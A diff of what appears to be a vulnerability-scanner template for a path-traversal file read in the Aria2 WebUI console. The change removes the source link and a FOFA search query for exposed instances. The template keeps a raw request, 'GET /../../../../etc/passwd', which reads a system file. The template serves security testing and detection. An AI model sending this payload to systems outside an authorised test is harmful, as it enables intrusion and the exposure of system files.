@@ -3,12 +3,8 @@ info:
   name: Aria2 WebUI控制台 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ahlx0ymuwhh8wnug'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ahlx0ymuwhh8wnug
-    fofa: app="Aria2-WebUI"
 http:
 - raw:
   - 'GET /../../../../etc/passwd HTTP/1.1
